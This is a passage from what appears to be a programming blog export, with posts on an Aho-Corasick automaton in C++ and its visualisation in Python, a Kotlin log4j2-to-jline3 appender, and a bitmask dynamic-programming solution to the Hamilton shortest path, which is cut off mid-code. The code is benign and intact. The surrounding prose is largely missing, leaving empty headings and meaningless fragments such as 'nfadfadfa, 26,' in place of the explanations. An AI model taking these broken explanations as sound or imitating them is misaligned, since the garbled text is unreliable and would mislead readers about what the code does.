<span class="keyword">if</span> (fail[p] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">                p = fail[p] - <span class="number">1</span>; <span class="comment">// (fail1)</span></span><br><span class="line">                <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                    re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// </span></span><br><span class="line">        rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rev;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">printVector</span><span class="params">(vector&lt;string&gt; t)</span> </span>&#123;</span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i: t)</span><br><span class="line">        re += i + <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;aaaaaa&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;bbbbbb&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;ababab&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;cacsafasfasfsgefacsdcewg&quot;</span>);</span><br><span class="line">    <span class="built_in">trieFail</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;:&quot;</span> + <span class="built_in">to_string</span>(now) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;aaaaaaabbbbbbbbbacacsafasfasfsgefacsdcewgbaabcaaaaaaabbbbbbbbbbbbabbbbbbbbbbbbaav&quot;</span>)) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s; i++)</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> a: fail)</span><br><span class="line">        cout &lt;&lt; a - <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-"><a href="#4-" class="headerlink" title="4. "></a>4. </h2><p>python<a href="https://pypi.org/project/visual-automata/">visual-automata</a></p><h3 id="4-1-cpp-"><a href="#4-1-cpp-" class="headerlink" title="4.1 cpp "></a>4.1 cpp </h3><p>(<br><code>vector&lt;int&gt; final;</code><br>triedAddpush_back</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// , </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// </span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// </span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span>.<span class="built_in">push_back</span>(p);</span><br><span class="line">    endNodes[p / bitW] = endNodes[p / bitW] ^ (<span class="number">1</span> &lt;&lt; (p &amp; (bitW - <span class="number">1</span>))); <span class="comment">// , endNodes[p/bitW]^(1&lt;&lt;n)n, p&amp;63:2^n,p&amp;(k-1),p&amp;63</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nlohmann::json j;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; now;i++)</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> a = <span class="number">0</span>; a &lt; <span class="number">26</span>; a ++)</span><br><span class="line">           j[<span class="number">0</span>][i][a] = nodes[i][a];</span><br><span class="line">   j[<span class="number">1</span>] = fail;</span><br><span class="line">   j[<span class="number">2</span>] = <span class="keyword">final</span>;</span><br><span class="line">   cout&lt;&lt;endl&lt;&lt;j.<span class="built_in">dump</span>();</span><br></pre></td></tr></table></figure><p>json</p><h3 id="4-2-python"><a href="#4-2-python" class="headerlink" title="4.2 python"></a>4.2 python</h3><p><a href="https://pypi.org/project/visual-automata/#prerequisites">pypi</a>, json<code>jsonData</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># author: Eritque arcus</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> visual_automata.fa.nfa <span class="keyword">import</span> VisualNFA</span><br><span class="line"></span><br><span class="line">jsonData = <span class="string">&quot;[[[1,7,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[2,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0],[22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0],[0,0,0,0,0,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,0,0,0,0,0,0,0],[0,0,0,0,0,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0,0,0,0,0],[0,0,0,0,0,0,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,0,0,0,0,0,0,0],[0,0,0,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0],[0,0,0,0,0,0,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]],[0,1,2,3,4,5,6,1,8,9,10,11,12,8,2,14,15,16,1,2,19,1,2,1,2,1,1,2,1,1,1,1,1,1,2,19,1,1,19,1,1,1,0,0,0,0,0,0,0,0],[6,12,17,41]]&quot;</span></span><br><span class="line">a = json.loads(jsonData)</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>])):</span><br><span class="line">    it = &#123;&#125;  <span class="comment"># inside transition</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>][j])):</span><br><span class="line">        <span class="keyword">if</span> a[<span class="number">0</span>][j][i] != <span class="number">0</span>:</span><br><span class="line">            it[<span class="built_in">chr</span>(i + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))] = &#123;<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(a[<span class="number">0</span>][j][i])&#125;</span><br><span class="line">            <span class="keyword">if</span> a[<span class="number">1</span>][j] &gt; <span class="number">0</span>:</span><br><span class="line">                it[<span class="string">&quot;fail&quot;</span>] = &#123;<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(a[<span class="number">1</span>][j] - <span class="number">1</span>)&#125;</span><br><span class="line">    t[<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(j)] = it</span><br><span class="line">inputS = <span class="built_in">set</span>([<span class="built_in">chr</span>(b + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">inputS.add(<span class="string">&quot;fail&quot;</span>)</span><br><span class="line">nfa = VisualNFA(</span><br><span class="line">    states=<span class="built_in">set</span>([<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>]))]),</span><br><span class="line">    input_symbols=inputS,</span><br><span class="line">    transitions=t,</span><br><span class="line">    initial_state=<span class="string">&quot;q0&quot;</span>,</span><br><span class="line">    final_states=<span class="built_in">set</span>([<span class="string">&quot;q&quot;</span> + <span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> a[<span class="number">2</span>]])</span><br><span class="line">)</span><br><span class="line">nfa.show_diagram(view=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>nfadfadfa, 26, <code>fail</code></p><h3 id="4-3-"><a href="#4-3-" class="headerlink" title="4.3 "></a>4.3 </h3><p><img src="/images/aho-corasick-automaton-(AC%E8%87%AA%E5%8A%A8%E6%9C%BA)%E7%9A%84%E7%90%86%E8%A7%A3.md-0.png" alt="nfa"></p><center>end</center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> Aho-corasick </tag>
            
            <tag> Trie-tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlinlog4j2jline3</title>
      <link href="/2021/11/19/kotlin%E9%87%8D%E5%AE%9A%E5%90%91log4j2%E7%9A%84%E8%BE%93%E5%87%BA%E5%88%B0jline3/"/>
      <url>/2021/11/19/kotlin%E9%87%8D%E5%AE%9A%E5%90%91log4j2%E7%9A%84%E8%BE%93%E5%87%BA%E5%88%B0jline3/</url>
      
        <content type="html"><![CDATA[<h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p><code>log4j2</code><code>jline3</code>, <code>log4j2</code>System.outjline3<code>lineReader.printAbove()</code></p><p><code>Appender</code>, <code>Appender</code><code>log4j2.xml</code></p><h2 id="2-Console"><a href="#2-Console" class="headerlink" title="2. Console"></a>2. Console</h2><p>Jline3, <br><code>lineReader</code><code>printAbove</code>()</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> Console&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">val</span> terminal: Terminal = <span class="comment">/*complie code*/</span></span><br><span class="line">   <span class="keyword">internal</span> <span class="keyword">val</span> lineReader: LineReader <span class="keyword">by</span> lazy &#123;</span><br><span class="line">        LineReaderBuilder.builder().terminal(terminal).completer(NullCompleter()).build()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Appender"><a href="#3-Appender" class="headerlink" title="3. Appender"></a>3. Appender</h2><p><a href="https://stackoverflow.com/a/24220688/14646226">Remko Popmastackoverflow</a></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tech.eritquearcus.xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.AbstractLifeCycle</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.Filter</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.Layout</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.LogEvent</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.appender.AbstractAppender</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.Plugin</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.PluginAttribute</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.PluginElement</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.plugins.PluginFactory</span><br><span class="line"><span class="keyword">import</span> org.fusesource.jansi.Ansi</span><br><span class="line"><span class="comment">// import, Serializablekotlin.io internal object</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable</span><br><span class="line"></span><br><span class="line"><span class="comment">// name, name, , append</span></span><br><span class="line"><span class="meta">@Plugin(name = <span class="string">&quot;Jline3Appender&quot;</span>, category = <span class="string">&quot;Core&quot;</span>, elementType = <span class="string">&quot;appender&quot;</span>, printObject = true)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Jline3AppenderImpl</span> <span class="keyword">protected</span> <span class="keyword">constructor</span>(</span><br><span class="line">    name: String, filter: Filter?,</span><br><span class="line">    layout: Layout&lt;Serializable&gt;, ignoreExceptions: <span class="built_in">Boolean</span></span><br><span class="line">) : AbstractAppender(name, filter, layout, ignoreExceptions, <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">append</span><span class="params">(event: <span class="type">LogEvent</span>)</span></span> &#123;</span><br><span class="line">       <span class="comment">// Console, Ansi</span></span><br><span class="line">        Console.lineReader.printAbove(String(layout.toByteArray(event)) + Ansi().reset().toString())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">      <span class="comment">// 2Factory method</span></span><br><span class="line">        <span class="meta">@PluginFactory</span></span><br><span class="line">        <span class="meta">@JvmStatic</span> </span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">createAppender</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@PluginAttribute(<span class="string">&quot;name&quot;</span>)</span> name: <span class="type">String</span>?,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@PluginElement(<span class="string">&quot;Layout&quot;</span>)</span> layout: <span class="type">Layout</span>&lt;<span class="type">Serializable</span>&gt;,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@PluginElement(<span class="string">&quot;Filter&quot;</span>)</span> filter: <span class="type">Filter</span>?</span></span></span><br><span class="line"><span class="params"><span class="function">        )</span></span>: Jline3AppenderImpl? &#123;</span><br><span class="line">            <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">                AbstractLifeCycle.LOGGER.error(<span class="string">&quot;No name provided for MyCustomAppenderImpl&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Jline3AppenderImpl(name, filter, layout, <span class="literal">true</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-log4j2-xml"><a href="#4-log4j2-xml" class="headerlink" title="4. log4j2.xml"></a>4. log4j2.xml</h2><p><code>src/main/resource</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;tech.eritquearcus.xxx.xxx.xxx&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Jline3Appender</span> <span class="attr">name</span>=<span class="string">&quot;jline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">pattern</span>=<span class="string">&quot;%highlight&#123;%d&#123;YYYY.MM.dd HH:mm:ss&#125; [%-5level] %logger&#123;36&#125; - %message&#125;&#123;FATAL=bg_red, ERROR=red, WARN=yellow, INFO=green&#125;\n&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">disableAnsi</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Jline3Appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;jline&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><ul><li><code>Configuration</code>appenderpackage</li><li><code>Jline3Appender</code>Appender<code>@plugin</code><code>name</code></li><li><code>Jline3Appender</code>name<code>Loggers</code><code>AppenderRef</code><code>ref</code></li><li><code>PatternLayout</code>  <code>disableAnsi=&quot;false&quot;</code></li><li><code>PatternLayout</code></li></ul><center>end</center>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hamilton</title>
      <link href="/2021/06/20/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2021/06/20/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="hamilton"><a href="#hamilton" class="headerlink" title="hamilton"></a>hamilton</h2><p>:</p><blockquote><p> n(n20)  0~n-1  0  n-1 Hamilton Hamilton 0  n-1 <br><br><img src="/images/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3.md-0.png" alt=":home.ustc.edu.cn/~xxxujian/homework8.pdf"></p></blockquote><p>^ xor, ^ </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul><li><code>(n&gt;&gt;k)&amp;1</code> nk(nk10k)k</li><li><code>n^(1&lt;&lt;k)</code> nk</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>intbool<br>boolC++1byteintC++4bytes (: <a href="https://docs.microsoft.com/zh-tw/cpp/cpp/fundamental-types-cpp?view=msvc-160#sizes-of-built-in-types">https://docs.microsoft.com/zh-tw/cpp/cpp/fundamental-types-cpp?view=msvc-160#sizes-of-built-in-types</a>)<br>bool4int20(n &lt;&#x3D; 20), int202^20(1&lt;&lt;20)1,048,576int2147483647, .<br>intxx</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><br>int<br>f(2 ^ 20)*202 ^ 202^202 ^ 2020().<br>: f[12][4] 23(121100)4<br>f[0]01</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>()<strong>0x3F</strong>(0x7F10^9)</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>n*n[i, j]ijij()<code>weight</code><br><img src="/images/%E5%AF%B9%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9%E5%92%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B1%82hamilton%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%9A%84%E7%90%86%E8%A7%A3.md-0.png" alt=": home.ustc.edu.cn/~xxxujian/homework8.pdf"><br>()</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>int</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[<span class="number">1</span>&lt;&lt;<span class="number">20</span>][<span class="number">20</span>]; <span class="comment">//2^20*20</span></span><br><span class="line"><span class="comment">// n, weight</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hamilton</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> weight[<span class="number">20</span>][<span class="number">20</span>])</span></span>&#123;</span><br><span class="line">   <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(f)); <span class="comment">// f</span></span><br><span class="line">   f[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// (1010)(00)0</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i ++)&#123;</span><br><span class="line">      <span class="comment">// 0...11...1</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">         <span class="comment">// </span></span><br><span class="line">         <span class="keyword">if</span>((i &gt;&gt; j) &amp; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// iintj1j,(+1),,weight</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line">               <span class="comment">// </span></span><br><span class="line">               <span class="keyword">if</span>((i^ (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                  <span class="comment">// k</span></span><br><span class="line">                  f[i][j] = <span class="built_in">min</span>(f[i][j], f[i^(<span class="number">1</span>&lt;&lt;j)][k] + weight[k][j]);</span><br><span class="line">                  <span class="comment">// f[i][j]ij[i, j]minf[i][j](0x3F)ijk + jk(jk0x3F)</span></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   